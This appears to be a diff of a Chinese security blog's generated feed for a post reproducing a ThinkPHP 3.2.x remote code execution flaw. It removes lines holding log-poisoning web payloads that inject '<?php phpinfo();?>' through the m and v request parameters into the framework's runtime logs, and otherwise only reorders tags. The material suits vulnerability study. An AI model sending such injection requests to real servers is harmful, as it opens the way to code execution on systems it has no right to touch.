@@ -47,10 +47,10 @@
 <p>日志在<code>Application/Runtime/Logs/Home</code>目录下</p>
 <p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154445495.png" alt="image-20210714154445495"></p>
 <p>开启debug</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?m=Home&amp;v=--&gt;<span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span>  <span class="comment">//这个请求不会报错 日志文件在 Application/Runtime/Logs/Home下</span></span><br><span class="line">index.php?m--&gt;<span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span>  <span class="comment">//这个请求会报错 日志文件在 Application/Runtime/Logs/Common下</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">请求不报错 日志文件在 Application<span class="regexp">/Runtime/</span>Logs/Home下</span><br><span class="line">请求会报错 日志文件在 Application<span class="regexp">/Runtime/</span>Logs/Common下</span><br></pre></td></tr></table></figure>
 
 <p>关闭debug</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?m=Home&amp;v=--&gt;<span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span>  <span class="comment">//这个请求不会报错 不会记录日志</span></span><br><span class="line">index.php?m--&gt;<span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span>  <span class="comment">//这个请求会报错 日志文件在 Application/Runtime/Logs/Common下</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">请求不会报错 不会记录日志</span><br><span class="line">请求会报错 日志文件在 Application/Runtime/Logs/<span class="meta">Common</span>下</span><br></pre></td></tr></table></figure>
 
 
 
@@ -2010,8 +2010,8 @@ dir(builtins) //打印所有的内联函数可获取eval exec</code></pre><p><co
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>复现</tag>
         <tag>CTF</tag>
+        <tag>复现</tag>
       </tags>
   </entry>
   <entry>
